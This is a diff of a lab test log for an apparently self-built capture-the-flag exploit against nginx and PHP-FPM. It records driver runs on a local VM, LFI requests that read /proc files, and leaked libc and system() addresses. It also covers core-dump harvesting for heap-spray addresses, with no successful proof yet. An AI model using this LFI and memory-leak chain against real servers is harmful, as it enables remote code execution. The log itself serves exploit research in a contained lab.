@@ -1,6 +1,6 @@
 # Nginx Rift CTF Tests
 
-Last updated: 2026-05-14 23:06:13 CEST
+Last updated: 2026-05-14 23:25:48 CEST
 
 ## Baseline: Original PoC Command Execution
 
@@ -138,7 +138,7 @@ Core-guided candidates did not produce proof.
 
 Status: failed proof, but passed core-read and spray-address-discovery subtests.
 
-## Next Test: Core-Guided Mode With Post-Read Worker Reset
+## Same-Port Core-Guided Mode With Post-Read Worker Reset
 
 Purpose: determine whether same-port LFI core extraction perturbs the worker heap before the final exploit attempts.
 
@@ -147,14 +147,6 @@ Command:
 ```bash
 ./ctf_remote_exploit.py --host 127.0.0.1 --port 19321 --core-guided --tries-per-candidate 10 --verbose
 ```
-
-Expected new behavior:
-
-```text
-Resetting nginx worker after LFI core read to restore a clean heap state
-```
-
-Status: queued.
 
 Observed:
 
@@ -166,3 +158,109 @@ Core-guided candidates did not produce proof.
 ```
 
 Status: failed proof. Worker reset did not improve the result.
+
+## Vagrant ESXi Launch
+
+Purpose: create a real x86_64 Ubuntu lab VM on the `Ultra` ESXi host.
+
+Commands:
+
+```bash
+vagrant validate
+vagrant up --provider=vmware_esxi
+```
+
+Observed:
+
+```text
+root@ultra.home SSH key auth works.
+ovftool still requires ESXi password auth for upload/import.
+VMID: 24
+VM IP: 192.168.1.205
+Direct Vagrant-key SSH to vagrant@192.168.1.205 works.
+```
+
+Status: partial pass. VM creation succeeded; provider guest communication did not complete, so provisioning was completed by rsync plus direct SSH.
+
+## Vagrant x86_64 Same-Port Smoke Test
+
+Purpose: remove Docker Desktop amd64 emulation from the lab while preserving the x86_64 target architecture.
+
+Commands:
+
+```bash
+vagrant up --provider=vmware_esxi
+curl -sS http://192.168.1.205:19321/
+curl -sS 'http://192.168.1.205:19321/lfi.php?file=/proc/self/status' | sed -n '1,20p'
+curl -sS 'http://192.168.1.205:19321/lfi.php?file=/proc/sys/kernel/randomize_va_space'
+```
+
+Observed:
+
+```text
+HTTP /: ok
+php-fpm8.1 UID/GID: 65534/65534
+randomize_va_space: 2
+uname -m: x86_64
+nginx-rift/php8.1-fpm/nginx-rift-backend: active
+```
+
+Status: pass.
+
+## Vagrant x86_64 Remote Driver Discovery
+
+Purpose: confirm the HTTP-only driver can derive target facts on a real x86_64 Ubuntu VM with ASLR enabled.
+
+Command:
+
+```bash
+./ctf_remote_exploit.py --host 192.168.1.205 --port 19321 --tries-per-candidate 1 --proof-delay 0.2 --verbose
+```
+
+Observed:
+
+```text
+Nginx worker PID discovered over LFI: 11975
+Nginx writable image mapping: 0x55dd1b08e000
+libc base/path from worker maps: 0x7fc69afa8000 /usr/lib/x86_64-linux-gnu/libc.so.6
+system() offset from LFI-read libc ELF: 0x50d70
+system() absolute address: 0x7fc69aff8d70
+URI-safe candidate cleanup addresses: 0 / 20
+```
+
+Status: pass for remote derivation, fail for legacy candidate availability in that ASLR layout.
+
+## Vagrant x86_64 Core-Guided Mode
+
+Purpose: test whether LFI-readable core dumps can recover usable sprayed fake-structure addresses on the real VM.
+
+Setup fixes:
+
+```text
+kernel.core_pattern=core
+kernel.core_uses_pid=0
+fs.suid_dumpable=2
+apport disabled
+/app/tmp owned by nobody:nogroup
+```
+
+Command:
+
+```bash
+./ctf_remote_exploit.py --host 192.168.1.205 --port 19321 --core-guided --tries-per-candidate 2 --proof-delay 0.25 --verbose
+```
+
+Observed:
+
+```text
+Nginx writable image mapping: 0x55d483d21000
+libc base/path from worker maps: 0x7f0bb665f000 /usr/lib/x86_64-linux-gnu/libc.so.6
+URI-safe candidate cleanup addresses: 0 / 20
+No legacy URI-safe candidates; using safe bogus probe address 0x303030303030 to generate a core
+Core-guided sprayed-body addresses: 0 URI-safe / 20 total
+unsafe core hit: 0x55d484df7477
+unsafe core hit: 0x55d484dfdeb7
+...
+```
+
+Status: partial pass. The VM produces LFI-readable cores and the driver recovers sprayed fake-structure addresses, but this ASLR layout produced no URI-safe target address and therefore no CTF marker proof.
